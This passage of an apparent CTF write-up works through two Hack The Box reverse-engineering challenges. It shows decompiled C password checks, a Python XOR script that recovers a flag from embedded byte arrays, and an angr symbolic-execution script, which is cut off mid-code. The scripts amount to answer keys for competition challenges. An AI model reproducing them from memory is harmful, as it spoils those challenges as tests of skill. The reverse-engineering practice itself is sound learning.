<h2 id="She-Shells-C-Shells"><a href="#She-Shells-C-Shells" class="headerlink" title="She Shells C Shells"></a>She Shells C Shells</h2><p>func_flag:</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br></pre></td><td class="code"><pre><span class="line"></span><br><span class="line">undefined8 <span class="title function_">func_flag</span><span class="params">(<span class="type">void</span>)</span></span><br><span class="line"></span><br><span class="line">&#123;</span><br><span class="line">  undefined8 uVar1;</span><br><span class="line">  undefined8 user_input;</span><br><span class="line">  </span><br><span class="line">  <span class="type">int</span> local_14;</span><br><span class="line">  uint j;</span><br><span class="line">  uint i;</span><br><span class="line">  </span><br><span class="line">  <span class="built_in">printf</span>(<span class="string">&quot;Password: &quot;</span>);</span><br><span class="line">  user_input = <span class="number">0</span>;</span><br><span class="line">  </span><br><span class="line">  fgets((<span class="type">char</span> *)&amp;user_input,<span class="number">0x100</span>,<span class="built_in">stdin</span>);</span><br><span class="line">  <span class="keyword">for</span> (i = <span class="number">0</span>; i &lt; <span class="number">0x4d</span>; i = i + <span class="number">1</span>) &#123;</span><br><span class="line">    *(byte *)((<span class="type">long</span>)&amp;user_input + (<span class="type">long</span>)(<span class="type">int</span>)i) =</span><br><span class="line">         *(byte *)((<span class="type">long</span>)&amp;user_input + (<span class="type">long</span>)(<span class="type">int</span>)i) ^ m1[(<span class="type">int</span>)i];</span><br><span class="line">  &#125;</span><br><span class="line">  local_14 = <span class="built_in">memcmp</span>(&amp;user_input,t,<span class="number">0x4d</span>);</span><br><span class="line">  <span class="keyword">if</span> (local_14 == <span class="number">0</span>) &#123;</span><br><span class="line">    <span class="keyword">for</span> (j = <span class="number">0</span>; j &lt; <span class="number">0x4d</span>; j = j + <span class="number">1</span>) &#123;</span><br><span class="line">      *(byte *)((<span class="type">long</span>)&amp;user_input + (<span class="type">long</span>)(<span class="type">int</span>)j) =</span><br><span class="line">           *(byte *)((<span class="type">long</span>)&amp;user_input + (<span class="type">long</span>)(<span class="type">int</span>)j) ^ m2[(<span class="type">int</span>)j];</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;Flag: %s\n&quot;</span>,&amp;user_input);</span><br><span class="line">    uVar1 = <span class="number">0</span>;</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">else</span> &#123;</span><br><span class="line">    uVar1 = <span class="number">0xffffffff</span>;</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">return</span> uVar1;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p><code>memcmp</code> function before second for loop(ignore first) variable “t” being compared to value stored in user_input memory location if so then it being xored with vairable “m2” that makes our flag.</p>
<p>so we need “t” and “m2” to get the flag, through static analysis we can see the value of both var</p>
<h3 id="Solve-1"><a href="#Solve-1" class="headerlink" title="Solve"></a>Solve</h3><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line">t = <span class="string">b&#x27;\x2c\x4a\xb7\x99\xa3\xe5\x70\x78\x93\x6e\x97\xd9\x47\x6d\x38\xbd\xff\xbb\x85\x99\x6f\xe1\x4a\xab\x74\xc3\x7b\xa8\xb2\x9f\xd7\xec\xeb\xcd\x63\xb2\x39\x23\xe1\x84\x92\x96\x09\xc6\x99\xf2\x58\xfa\xcb\x6f\x6f\x5e\x1f\xbe\x2b\x13\x8e\xa5\xa9\x99\x93\xab\x8f\x70\x1c\xc0\xc4\x3e\xa6\xfe\x93\x35\x90\xc3\xc9\x10\xe9&#x27;</span></span><br><span class="line"></span><br><span class="line">m2 = <span class="string">b&#x27;\x64\x1e\xf5\xe2\xc0\x97\x44\x1b\xf8\x5f\xf9\xbe\x18\x5d\x48\x8e\x91\xe4\xf6\xf1\x5c\x8d\x26\x9e\x2b\xa1\x02\xf7\xc6\xf7\xe4\xb3\x98\xfe\x57\xed\x4a\x4b\xd1\xf6\xa1\xeb\x09\xc6\x99\xf2\x58\xfa\xcb\x6f\x6f\x5e\x1f\xbe\x2b\x13\x8e\xa5\xa9\x99\x93\xab\x8f\x70\x1c\xc0\xc4\x3e\xa6\xfe\x93\x35\x90\xc3\xc9\x10\xe9&#x27;</span></span><br><span class="line"></span><br><span class="line">flag = <span class="string">&quot;&quot;</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">77</span>):</span><br><span class="line">        <span class="keyword">if</span> i &lt; <span class="built_in">len</span>(t) <span class="keyword">and</span> i &lt; <span class="built_in">len</span>(m2):</span><br><span class="line">                flag += <span class="built_in">chr</span>(t[i]^m2[i])</span><br><span class="line"></span><br><span class="line">flag = re.search(<span class="string">r&#x27;HTB&#123;.*&#125;&#x27;</span>, flag).group(<span class="number">0</span>)</span><br><span class="line"><span class="built_in">print</span>(flag)</span><br><span class="line"></span><br></pre></td></tr></table></figure>


<h2 id="Cave-System"><a href="#Cave-System" class="headerlink" title="Cave System"></a>Cave System</h2><p>after some hands on angr module and solving Shattered tablet challenge i got some guts and tried to solve this one too</p>
<details> 
<summary>main funciton</summary>

<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br><span class="line">130</span><br><span class="line">131</span><br><span class="line">132</span><br><span class="line">133</span><br><span class="line">134</span><br><span class="line">135</span><br><span class="line">136</span><br><span class="line">137</span><br><span class="line">138</span><br><span class="line">139</span><br><span class="line">140</span><br><span class="line">141</span><br><span class="line">142</span><br><span class="line">143</span><br><span class="line">144</span><br><span class="line">145</span><br><span class="line">146</span><br><span class="line">147</span><br><span class="line">148</span><br><span class="line">149</span><br><span class="line">150</span><br><span class="line">151</span><br><span class="line">152</span><br><span class="line">153</span><br><span class="line">154</span><br><span class="line">155</span><br><span class="line">156</span><br><span class="line">157</span><br><span class="line">158</span><br><span class="line">159</span><br><span class="line">160</span><br><span class="line">161</span><br><span class="line">162</span><br><span class="line">163</span><br><span class="line">164</span><br></pre></td><td class="code"><pre><span class="line">undefined8 <span class="title function_">main</span><span class="params">(<span class="type">void</span>)</span></span><br><span class="line"></span><br><span class="line">&#123;</span><br><span class="line">  <span class="type">int</span> iVar1;</span><br><span class="line">  undefined8 local_88;</span><br><span class="line">  undefined8 local_80;</span><br><span class="line">  undefined8 local_78;</span><br><span class="line">  undefined8 local_70;</span><br><span class="line">  undefined8 local_68;</span><br><span class="line">  undefined8 local_60;</span><br><span class="line">  undefined8 local_58;</span><br><span class="line">  undefined8 local_50;</span><br><span class="line">  undefined8 local_48;</span><br><span class="line">  undefined8 local_40;</span><br><span class="line">  undefined8 local_38;</span><br><span class="line">  undefined8 local_30;</span><br><span class="line">  undefined8 local_28;</span><br><span class="line">  undefined8 local_20;</span><br><span class="line">  undefined8 local_18;</span><br><span class="line">  undefined8 local_10;</span><br><span class="line">  </span><br><span class="line">  local_88 = <span class="number">0</span>;</span><br><span class="line">  local_80 = <span class="number">0</span>;</span><br><span class="line">  local_78 = <span class="number">0</span>;</span><br><span class="line">  local_70 = <span class="number">0</span>;</span><br><span class="line">  local_68 = <span class="number">0</span>;</span><br><span class="line">  local_60 = <span class="number">0</span>;</span><br><span class="line">  local_58 = <span class="number">0</span>;</span><br><span class="line">  local_50 = <span class="number">0</span>;</span><br><span class="line">  local_48 = <span class="number">0</span>;</span><br><span class="line">  local_40 = <span class="number">0</span>;</span><br><span class="line">  local_38 = <span class="number">0</span>;</span><br><span class="line">  local_30 = <span class="number">0</span>;</span><br><span class="line">  local_28 = <span class="number">0</span>;</span><br><span class="line">  local_20 = <span class="number">0</span>;</span><br><span class="line">  local_18 = <span class="number">0</span>;</span><br><span class="line">  local_10 = <span class="number">0</span>;</span><br><span class="line">  <span class="built_in">printf</span>(<span class="string">&quot;What route will you take out of the cave? &quot;</span>);</span><br><span class="line">  fgets((<span class="type">char</span> *)&amp;local_88,<span class="number">0x80</span>,<span class="built_in">stdin</span>);</span><br><span class="line">  iVar1 = <span class="built_in">memcmp</span>(&amp;local_88,&amp;DAT_00402033,<span class="number">4</span>);</span><br><span class="line">  <span class="keyword">if</span> (((((((iVar1 == <span class="number">0</span>) &amp;&amp; ((byte)(local_78._5_1_ * (<span class="type">char</span>)local_58) == <span class="string">&#x27;\x14&#x27;</span>)) &amp;&amp;</span><br><span class="line">         ((byte)((byte)local_68 - local_68._4_1_) == <span class="number">-6</span>)) &amp;&amp;</span><br><span class="line">        (((((((byte)(local_68._5_1_ - local_70._2_1_) == <span class="number">-0x2a</span> &amp;&amp;</span><br><span class="line">             ((byte)((byte)local_78 - (<span class="type">char</span>)local_58) == <span class="string">&#x27;\b&#x27;</span>)) &amp;&amp;</span><br><span class="line">            (((<span class="type">char</span>)(local_58._7_1_ - (<span class="type">char</span>)local_80) == <span class="number">-0x2b</span> &amp;&amp;</span><br><span class="line">             (((byte)(local_70._2_1_ * local_88._7_1_) == <span class="number">-0x13</span> &amp;&amp;</span><br><span class="line">              ((<span class="type">char</span>)(local_88._4_1_ * (<span class="type">char</span>)local_70) == <span class="number">-0x38</span>)))))) &amp;&amp;</span><br><span class="line">           ((local_68._2_1_ ^ local_70._4_1_) == <span class="number">0x55</span>)) &amp;&amp;</span><br><span class="line">          (((((byte)(local_70._6_1_ - local_58._7_1_) == <span class="string">&#x27;4&#x27;</span> &amp;&amp;</span><br><span class="line">             ((byte)(local_50._3_1_ + local_58._2_1_) == <span class="number">-0x71</span>)) &amp;&amp;</span><br><span class="line">            ((byte)(local_60._4_1_ + local_70._3_1_) == <span class="number">-0x2a</span>)) &amp;&amp;</span><br><span class="line">           (((local_78._1_1_ ^ local_80._6_1_) == <span class="number">0x31</span> &amp;&amp;</span><br><span class="line">            ((byte)((byte)local_50 * local_78._4_1_) == <span class="number">-0x54</span>)))))) &amp;&amp;</span><br><span class="line">         (((((byte)(local_50._2_1_ - local_70._2_1_) == <span class="number">-0x3e</span> &amp;&amp;</span><br><span class="line">            (((local_70._2_1_ ^ local_88._6_1_) == <span class="number">0x2f</span> &amp;&amp;</span><br><span class="line">             ((local_80._6_1_ ^ local_68._7_1_) == <span class="number">0x5a</span>)))) &amp;&amp;</span><br><span class="line">           ((local_60._4_1_ ^ local_68._7_1_) == <span class="number">0x40</span>)) &amp;&amp;</span><br><span class="line">          ((((((byte)local_60 == local_70._2_1_ &amp;&amp;</span><br><span class="line">              ((byte)(local_78._7_1_ + local_58._1_1_) == <span class="number">-0x68</span>)) &amp;&amp;</span><br><span class="line">             ((byte)(local_78._7_1_ * local_50._3_1_) == <span class="string">&#x27;h&#x27;</span>)) &amp;&amp;</span><br><span class="line">            (((byte)(local_88._1_1_ - local_70._4_1_) == <span class="number">-0x25</span> &amp;&amp;</span><br><span class="line">             ((byte)((<span class="type">char</span>)local_70 - local_70._5_1_) == <span class="number">-0x2e</span>)))) &amp;&amp;</span><br><span class="line">           (((<span class="type">char</span>)(local_68._6_1_ - (<span class="type">char</span>)local_70) == <span class="string">&#x27;.&#x27;</span> &amp;&amp;</span><br><span class="line">            ((((byte)local_68 ^ local_78._6_1_) == <span class="number">0x1a</span> &amp;&amp;</span><br><span class="line">             ((byte)(local_60._4_1_ * local_88._4_1_) == <span class="number">-0x60</span>)))))))))))) &amp;&amp;</span><br><span class="line">       ((((((byte)(local_68._6_1_ * local_70._3_1_) == <span class="string">&#x27;^&#x27;</span> &amp;&amp;</span><br><span class="line">           ((((byte)(local_80._7_1_ - (byte)local_60) == <span class="number">-0x38</span> &amp;&amp;</span><br><span class="line">             ((local_58._1_1_ ^ local_58._5_1_) == <span class="number">0x56</span>)) &amp;&amp;</span><br><span class="line">            ((local_70._2_1_ ^ local_60._5_1_) == <span class="number">0x2b</span>)))) &amp;&amp;</span><br><span class="line">          ((((((local_58._6_1_ ^ local_80._1_1_) == <span class="number">0x19</span> &amp;&amp;</span><br><span class="line">              ((byte)(local_70._4_1_ - local_60._7_1_) == <span class="string">&#x27;\x1a&#x27;</span>)) &amp;&amp;</span><br><span class="line">             (((byte)(local_58._2_1_ + local_78._3_1_) == <span class="number">-0x5f</span> &amp;&amp;</span><br><span class="line">              (((byte)(local_68._5_1_ + local_50._1_1_) == <span class="string">&#x27;V&#x27;</span> &amp;&amp;</span><br><span class="line">               ((local_70._5_1_ ^ local_78._2_1_) == <span class="number">0x38</span>)))))) &amp;&amp;</span><br><span class="line">            ((local_60._4_1_ ^ local_50._4_1_) == <span class="number">9</span>)) &amp;&amp;</span><br><span class="line">           ((((((<span class="type">char</span>)(local_80._7_1_ * local_68._6_1_) == <span class="string">&#x27;y&#x27;</span> &amp;&amp;</span><br><span class="line">               ((local_68._5_1_ ^ local_70._6_1_) == <span class="number">0x5d</span>)) &amp;&amp;</span><br><span class="line">              ((byte)(local_88._2_1_ * (byte)local_68) == <span class="string">&#x27;\\&#x27;</span>)) &amp;&amp;</span><br><span class="line">             (((byte)(local_80._2_1_ * local_78._2_1_) == <span class="string">&#x27;9&#x27;</span> &amp;&amp; (local_70._5_1_ == local_78._5_1_))</span><br><span class="line">             )) &amp;&amp; (((byte)(local_68._3_1_ * local_78._5_1_) == <span class="string">&#x27;/&#x27;</span> &amp;&amp;</span><br><span class="line">                    (((byte)((<span class="type">char</span>)local_80 * local_68._5_1_) == <span class="number">-0x55</span> &amp;&amp;</span><br><span class="line">                     ((byte)(local_68._7_1_ + local_70._2_1_) == <span class="number">-0x6d</span>)))))))))) &amp;&amp;</span><br><span class="line">         (((((((local_70._2_1_ ^ local_68._2_1_) == <span class="number">0x73</span> &amp;&amp;</span><br><span class="line">              ((((local_78._4_1_ ^ local_70._7_1_) == <span class="number">0x40</span> &amp;&amp;</span><br><span class="line">                ((byte)(local_70._1_1_ + (byte)local_78) == <span class="number">-0x57</span>)) &amp;&amp;</span><br><span class="line">               ((local_68._7_1_ ^ local_50._3_1_) == <span class="number">0x15</span>)))) &amp;&amp;</span><br><span class="line">             ((((byte)((byte)local_88 + local_50._3_1_) == <span class="string">&#x27;i&#x27;</span> &amp;&amp;</span><br><span class="line">               ((byte)(local_68._2_1_ + local_60._6_1_) == <span class="number">-0x5b</span>)) &amp;&amp;</span><br><span class="line">              (((local_70._6_1_ ^ local_58._4_1_) == <span class="number">0x37</span> &amp;&amp;</span><br><span class="line">               (((byte)((byte)local_88 * local_70._4_1_) == <span class="string">&#x27;\b&#x27;</span> &amp;&amp;</span><br><span class="line">                ((byte)(local_68._2_1_ - (byte)local_50) == <span class="number">-0x3b</span>)))))))) &amp;&amp;</span><br><span class="line">            ((byte)(local_78._2_1_ + local_50._4_1_) == <span class="number">-0x1c</span>)) &amp;&amp;</span><br><span class="line">           (((((local_68._3_1_ ^ (byte)local_60) == <span class="number">0x6e</span> &amp;&amp;</span><br><span class="line">              ((byte)((byte)local_50 * (byte)local_78) == <span class="number">-0x54</span>)) &amp;&amp;</span><br><span class="line">             ((byte)(local_58._6_1_ - local_60._7_1_) == <span class="string">&#x27;\r&#x27;</span>)) &amp;&amp;</span><br><span class="line">            ((((byte)(local_70._6_1_ + local_58._7_1_) == <span class="number">-100</span> &amp;&amp;</span><br><span class="line">              ((byte)(local_88._6_1_ + local_68._1_1_) == <span class="number">-0x2c</span>)) &amp;&amp;</span><br><span class="line">             (((byte)(local_88._7_1_ * local_70._5_1_) == <span class="number">-0x13</span> &amp;&amp;</span><br><span class="line">              ((((byte)local_50 ^ local_70._5_1_) == <span class="number">0x38</span> &amp;&amp;</span><br><span class="line">               ((byte)(local_88._1_1_ * local_68._5_1_) == <span class="string">&#x27;d&#x27;</span>)))))))))) &amp;&amp;</span><br><span class="line">          ((((byte)local_50 ^ local_50._2_1_) == <span class="number">0x46</span> &amp;&amp;</span><br><span class="line">           (((((((<span class="type">char</span>)(local_88._2_1_ * local_78._3_1_) == <span class="string">&#x27;&amp;&#x27;</span> &amp;&amp;</span><br><span class="line">                ((local_70._2_1_ ^ local_78._6_1_) == <span class="number">0x2b</span>)) &amp;&amp;</span><br><span class="line">               ((byte)(local_88._1_1_ + local_88._7_1_) == <span class="number">-0x79</span>)) &amp;&amp;</span><br><span class="line">              (((local_70._3_1_ ^ (byte)local_88) == <span class="number">0x2a</span> &amp;&amp;</span><br><span class="line">               ((byte)(local_78._5_1_ - local_88._1_1_) == <span class="string">&#x27;\v&#x27;</span>)))) &amp;&amp;</span><br><span class="line">             ((byte)(local_70._3_1_ + local_58._6_1_) == <span class="number">-0x32</span>)) &amp;&amp;</span><br><span class="line">            (((local_78._1_1_ ^ local_80._5_1_) == <span class="number">0x3b</span> &amp;&amp;</span><br><span class="line">             ((byte)(local_78._3_1_ - local_50._2_1_) == <span class="string">&#x27;\x12&#x27;</span>)))))))))) &amp;&amp;</span><br><span class="line">        ((((local_78._1_1_ == local_80._2_1_ &amp;&amp;</span><br><span class="line">           ((((byte)(local_80._6_1_ - local_50._2_1_) == <span class="string">&#x27;M&#x27;</span> &amp;&amp;</span><br><span class="line">             ((byte)(local_60._2_1_ * local_58._4_1_) == <span class="string">&#x27;N&#x27;</span>)) &amp;&amp; (local_58._2_1_ == (byte)local_68)</span><br><span class="line">            ))) &amp;&amp; (((local_60._7_1_ ^ local_58._3_1_) == <span class="number">0x38</span> &amp;&amp;</span><br><span class="line">                    ((<span class="type">char</span>)(local_68._6_1_ + local_70._1_1_) == <span class="number">-0x6c</span>)))) &amp;&amp;</span><br><span class="line">         ((byte)(local_60._1_1_ + local_58._4_1_) == <span class="number">-0x31</span>)))))) &amp;&amp;</span><br><span class="line">      ((((local_60._4_1_ == local_78._4_1_ &amp;&amp; ((<span class="type">char</span>)(local_80._4_1_ + local_70._1_1_) == <span class="string">&#x27;f&#x27;</span>)) &amp;&amp;</span><br><span class="line">        (((byte)(local_50._4_1_ + local_68._4_1_) == <span class="number">-0xf</span> &amp;&amp;</span><br><span class="line">         ((((byte)(local_60._1_1_ - local_78._5_1_) == <span class="string">&#x27;\x11&#x27;</span> &amp;&amp;</span><br><span class="line">           ((byte)(local_68._4_1_ - local_58._1_1_) == <span class="string">&#x27;D&#x27;</span>)) &amp;&amp;</span><br><span class="line">          ((byte)(local_80._1_1_ - local_68._3_1_) == <span class="string">&#x27;D&#x27;</span>)))))) &amp;&amp;</span><br><span class="line">       ((((local_58._5_1_ ^ local_58._3_1_) == <span class="number">1</span> &amp;&amp; ((local_68._2_1_ ^ local_50._1_1_) == <span class="number">0xd</span>)) &amp;&amp;</span><br><span class="line">        ((((byte)(local_80._3_1_ - local_70._4_1_) == <span class="number">-0x15</span> &amp;&amp;</span><br><span class="line">          (((((<span class="type">char</span>)(local_78._7_1_ + (<span class="type">char</span>)local_70) == <span class="number">-0x67</span> &amp;&amp;</span><br><span class="line">             ((byte)((<span class="type">char</span>)local_70 + local_80._5_1_) == <span class="number">-0x6b</span>)) &amp;&amp;</span><br><span class="line">            (((byte)(local_80._4_1_ - (byte)local_88) == <span class="number">-0x17</span> &amp;&amp;</span><br><span class="line">             (((((byte)(local_68._2_1_ + local_70._7_1_) == <span class="string">&#x27;`&#x27;</span> &amp;&amp;</span><br><span class="line">                ((byte)(local_88._5_1_ + local_58._5_1_) == <span class="number">-0x6a</span>)) &amp;&amp;</span><br><span class="line">               ((byte)(local_58._1_1_ * local_60._2_1_) == <span class="string">&#x27;`&#x27;</span>)) &amp;&amp;</span><br><span class="line">              (((byte)((<span class="type">char</span>)local_58 * local_78._5_1_) == <span class="string">&#x27;\x14&#x27;</span> &amp;&amp;</span><br><span class="line">               ((byte)(local_70._3_1_ - local_58._4_1_) == <span class="string">&#x27;\x03&#x27;</span>)))))))) &amp;&amp;</span><br><span class="line">           ((byte)(local_50._1_1_ + local_78._4_1_) == <span class="number">-0x6b</span>)))) &amp;&amp;</span><br><span class="line">         ((((byte)(local_80._2_1_ * local_58._5_1_) == <span class="number">-0x26</span> &amp;&amp;</span><br><span class="line">           ((byte)(local_88._1_1_ + local_60._1_1_) == <span class="number">-0x3c</span>)) &amp;&amp;</span><br><span class="line">          (((byte)(local_60._7_1_ - local_88._1_1_) == <span class="string">&#x27;\v&#x27;</span> &amp;&amp;</span><br><span class="line">           (((local_60._3_1_ == local_78._3_1_ &amp;&amp; ((byte)(local_68._7_1_ + local_60._7_1_) == <span class="number">-0x6d</span>)</span><br><span class="line">             ) &amp;&amp; ((byte)(local_80._4_1_ * local_50._2_1_) == <span class="string">&#x27;Q&#x27;</span>)))))))))))))) &amp;&amp;</span><br><span class="line">     (((((byte)((<span class="type">char</span>)local_80 * local_70._2_1_) == <span class="string">&#x27;A&#x27;</span> &amp;&amp;</span><br><span class="line">        ((byte)(local_60._6_1_ - local_70._7_1_) == <span class="string">&#x27;E&#x27;</span>)) &amp;&amp;</span><br><span class="line">       ((byte)(local_88._7_1_ + local_68._5_1_) == <span class="string">&#x27;h&#x27;</span>)) &amp;&amp;</span><br><span class="line">      (((((<span class="type">char</span>)(local_68._4_1_ + local_88._4_1_) == <span class="number">-0x44</span> &amp;&amp;</span><br><span class="line">         ((byte)(local_70._7_1_ + (byte)local_68) == <span class="number">-0x5e</span>)) &amp;&amp;</span><br><span class="line">        (((<span class="type">char</span>)(local_70._1_1_ + local_88._5_1_) == <span class="string">&#x27;e&#x27;</span> &amp;&amp;</span><br><span class="line">         ((((byte)(local_60._3_1_ * local_70._5_1_) == <span class="number">-0x13</span> &amp;&amp;</span><br><span class="line">           ((local_80._5_1_ ^ local_60._5_1_) == <span class="number">0x10</span>)) &amp;&amp;</span><br><span class="line">          ((<span class="type">char</span>)((<span class="type">char</span>)local_58 - local_80._4_1_) == <span class="string">&#x27;;&#x27;</span>)))))) &amp;&amp;</span><br><span class="line">       (((((<span class="type">char</span>)(local_78._7_1_ - (<span class="type">char</span>)local_80) == <span class="string">&#x27;\t&#x27;</span> &amp;&amp;</span><br><span class="line">          ((local_88._7_1_ ^ local_60._2_1_) == <span class="number">0x41</span>)) &amp;&amp;</span><br><span class="line">         ((<span class="type">char</span>)(local_88._5_1_ - local_60._3_1_) == <span class="number">-3</span>)) &amp;&amp;</span><br><span class="line">        (((((local_50._4_1_ ^ local_78._2_1_) == <span class="number">0x1a</span> &amp;&amp; ((local_88._1_1_ ^ local_88._3_1_) == <span class="number">0x2f</span>)</span><br><span class="line">           ) &amp;&amp; (((byte)(local_78._1_1_ - local_68._7_1_) == <span class="string">&#x27;+&#x27;</span> &amp;&amp;</span><br><span class="line">                 (((((byte)((<span class="type">char</span>)local_80 + local_78._4_1_) == <span class="number">-0x2d</span> &amp;&amp;</span><br><span class="line">                    ((byte)(local_80._3_1_ * local_58._5_1_) == <span class="number">-0x28</span>)) &amp;&amp;</span><br><span class="line">                   ((byte)(local_70._3_1_ + local_88._6_1_) == <span class="number">-0x2e</span>)) &amp;&amp;</span><br><span class="line">                  (((byte)(local_88._5_1_ + local_88._3_1_) == <span class="number">-0x55</span> &amp;&amp;</span><br><span class="line">                   ((byte)(local_68._3_1_ - local_60._7_1_) == <span class="number">-0x2e</span>)))))))) &amp;&amp;</span><br><span class="line">         (((byte)local_78 ^ local_68._1_1_) == <span class="number">0x10</span>)))))))))) &#123;</span><br><span class="line">    <span class="built_in">puts</span>(<span class="string">&quot;Freedom at last!&quot;</span>);</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">else</span> &#123;</span><br><span class="line">    <span class="built_in">puts</span>(<span class="string">&quot;Lost in the darkness, you\&#x27;ll wander for eternity...&quot;</span>);</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure>

</details>

<p>🙄 looks intimidating right? while competition i tried to to get the flag manually 😛, yeah it was silly<br>However, script that i used for solving the Shattered tablet worked for this challenge as well just change the target address </p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br></pre></td><td class="code"><pre><span class="line"></span><br><span class="line"><span class="keyword">import</span> angr</span><br><span class="line"><span class="keyword">import</span> sys</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">main</span>(<span class="params">argv</span>):</span><br><span class="line"></span><br><span class="line">  path_to_binary = argv[<span class="number">1</span>]  <span class="comment"># :string</span></span><br><span class="line">  project = angr.Project(path_to_binary)</span><br><span class="line"></span><br><span class="line">  initial_state = project.factory.entry_state(</span><br><span class="line">    add_options = &#123; angr.options.SYMBOL_FILL_UNCONSTRAINED_MEMORY,</span><br><span class="line">                    angr.options.SYMBOL_FILL_UNCONSTRAINED_REGISTERS&#125;</span><br><span class="line">  )</span><br><span class="line"></span><br><span class="line">  simulation = project.factory.simgr(initial_state)</span><br><span class="line"></span><br><span class="line">  print_good_address = <span class="number">0x401aba</span>  <span class="comment"># target address</span></span><br><span class="line">  simulation.explore(find=print_good_address)</span><br><span class="line"></span><br><span class="line">  <span class="keyword">if</span> simulation.found:</span><br><span class="line"></span><br><span class="line">    solution_state = simulation.found[<span class="number">0</span>]</span><br><span class="line">    <span class="built_in">print</span>(solution_state.posix.dumps(sys.stdin.fileno()).decode())</span><br><span class="line">  <span class="keyword">else</span>:</span><br><span class="line">    <span class="keyword">raise</span> Exception(<span class="string">&#x27;Could not find the solution&#x27;</span>)</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">&#x27;__main__&#x27;</span>:</span><br><span class="line">  